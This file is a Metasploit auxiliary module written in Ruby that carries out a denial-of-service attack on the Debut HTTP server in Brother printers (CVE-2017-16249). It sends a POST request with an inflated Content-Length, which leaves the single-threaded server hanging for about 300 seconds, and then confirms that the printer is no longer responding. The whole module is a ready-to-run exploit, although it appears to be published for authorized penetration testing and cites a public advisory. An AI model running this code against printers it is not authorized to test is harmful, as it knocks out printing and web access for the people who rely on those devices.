##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Brother Debut http Denial Of Service',
      'Description'    => %q{
        The Debut embedded HTTP server <= 1.20 on Brother printers allows for a Denial
        of Service (DoS) condition via a crafted HTTP request.  The printer will be
        unresponsive from HTTP and printing requests for ~300 seconds.  After which, the
        printer will start responding again.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
      [
        'z00n <0xz00n@gmail.com>', # vulnerability disclosure
        'h00die' # metasploit module
      ],
      'References'     => [
        [ 'CVE', '2017-16249' ],
        [ 'URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-017/?fid=10211']
      ],
      'DisclosureDate' => 'Nov 02 2017'))
  end

  def is_alive?
    res = send_request_raw({
      'method'	=> 'GET',
      'uri'	=> '/',
    },10)

    return !res.nil?
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
    print_error("Couldn't connect to #{peer}")
  end

  def dos
    # The web server is single threaded, and when the content length is longer than the data, it will continue to wait
    # for the rest of the data, which never comes, and times out after ~300 seconds.
    data = Rex::Text.rand_text_alphanumeric(40)
    send_request_cgi({
      'method' => 'POST',
      'uri'    => '/',
      'data'   => data, #'asdasdasdasdasdasdasd',
      'headers' => {
        # These are kept here since they were in the original exploit, however they are not required
        #'Host' => 'asdasdasd',
        #'User-Agent' => 'asdasdasd',
        #'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        #'Accept-Language' => 'en-US,en;q=0.5',
        #'Referer' => 'asdasdasdasd',
        #'Connection' => 'close',
         #'Upgrade-Insecure-Requests' => 1,
        #'Content-Type' => 'application/x-www-form-urlencoded',
        'Content-Length' => data.length + rand(10) + 10 #42
        }
      })
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
    print_error("Couldn't connect to #{peer}")
  end

  def run
    time = Time.new
    print_status("Sending malformed POST request at #{time.strftime("%Y-%m-%d %H:%M:%S")}.")
    dos

    # Check to see if it worked or not
    if is_alive?
      print_error("#{peer} - Server is still alive.")
    else
      print_good("#{peer} - Connection Refused: Success! Server will recover about #{(time + 300).strftime("%Y-%m-%d %H:%M:%S")}")
    end
  end
end
